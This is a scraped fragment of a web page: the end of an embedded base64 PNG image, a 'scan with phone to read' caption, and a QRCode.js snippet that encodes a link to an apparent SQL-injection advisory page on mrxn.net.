S9oIOgeRI2QfOcw6z0vF2HtfyZ/PyGe0pvgPZA3GYTb2P5ysQyr6I959+zy6pDHWd7rIXn1na/ny6f2LML6WtVrjN7PXNflf5O/nxBP8U3wNJDddCF3E8zo5wGzbh+Irk+E6BBUt06+Q0gdnHFXY29IjVw/RIcZzYuQvFyE6DCj+Y4w+4D7B8PHm72Ot72QafX9eRd11Kcu72ge0l+uTw7Jq1+hdSvc1cL6GhDdXr2+63LxWf/OZ5/C05esXnTznz2B00Agd4vbgDWvaVbAnC+tAmbdflcI67rqWXFVP+Zh7lX1FaOn1qVVwOyvXAVEhzVW7RhVU6EG6zqIXl7jNBATN77mBI6fQ7y8U+0cMs1dXj+sfT2/4/YX9XWEXAc+UY+1HXseUtt169Q79jzMffRD9O6Xi/oL7yekTuGN4hjIalq1T5inDOGVq4DwXg/RIVjeRD7q7wjxQzDuz4/dP3KYayAcZrSbtTDnIbz75DDnuw7rvNfb+YH755DHm71OP4fAeroQ3SnDzP28zMufRUg//faB6LBG/YXW1HoV5iG99KjvEGZ/r5OL9pHD8/XHlyyLb3ztCWzfZTnljpBpq0M4BP10zO84zP6dzz4d9T+D1uqVQ/YAQfMiRNevLofk1TvqEyF+mHGsu5+Q8TTeYL0dCMxThHCn7d7lIsQHQXX9HSE+dQiHNepbIcw1eiB651d7u8rbryPkehA0b7+vcDsQm9z4sydwvMtyarCeqtuC5CGoLtpHhPggqH6F9hP173jpesTSvgrInroHokNwl3/2OtbD3A/C4RPvJ8TTehM83mVBpnQ1dfOinwekXt6x+3v+b3nVQ/YAwatr9jzMdT0vF+uaY3T9io+1ru8nxJN4EzwG4jQhd0nf3y4Psx/CIWid/SA6BK906yF+CFo3ol7RXOfqkF7mRfMixAdr1Cf2PvBcXdUfAylyx+tP4HiXBZli3xLMep9+9/c8pB6CPW/9Tod1HUS3vhDOWukGzPndNXd+des6QvrDjN33Fb+fEE/5TfB4l+V+dtODeeo7P8Rnn+7bcfWOV31Gv17IHsbcag3xwRrtZ23nMNfp6whrH8w6cP99yOPNXqcvWTBPzf16d4jqEL9chK91SB5mtH6HEL/7gHD4xF3OnuY79vyOd90+O928qE9ULzwNRNONrzmB411Wv3xNq6Lr8HknAj19/O/yqraiG0r7KrofmP5jG/MQXT4iJOd1xlytIXkIllZx9pf6mK4PPHwBU26nw+yDcK8H4cD9PeTxZq/jXZbTEnf7NC/qg88pw+e6+6785q/QvivstSvPqOmH7Lvz0Vtr87Wu6Ly0MXb5lX5/D/FU3gSP7yGQuwOeQ/fvndC5OqSfeQg3ry6qi12Xi5B+gNIlAsuv/btrwtq/uxDE3/Mw6xAOn3g/If3UXsyPgXh3XOHVfiHTvvKZ79dTfxbH+l0NrPdkLcx5mHnvC8lDsOfte6XrG/EYSC+++WtO4DQQyNRhxt32IL6eh1mHv+O7/pC+8Ind6x3YdUiNeQjXBzNX3yHEDzN2P+zzp4H04pv/7Al820C8y3bb73k55G6R93p1mH3qK7QHpEYu9hp10fzvcus62kfsecg+gfsn9cebvb7tCYFM2en7eV5xfZB6ecfexzykDlA6fp92CJsFsPx5BKJbBuHuAdYcosOMva73lRd+20Cq2R1/fwKngTjNjrtLdR/k7lCHcOshHILqIsw6hMMarRsR4u17gOgQHGtqrX+HMNfBzKvHGPaBtc/8WHMayJi81z9/AsdAIFOEr3G3RUidU4c1t16fXFQXd7r5Ebv3Tzlk7zCj/USvLRfVIfXqIkSHoHrhMZAid7z+BO6BvH4G0w7+AwAA//8TpcQjAAAABklEQVQDAJYogssdFCO/AAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/dongsheng-MsCwGenlegAccitems-GetDataListCA-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 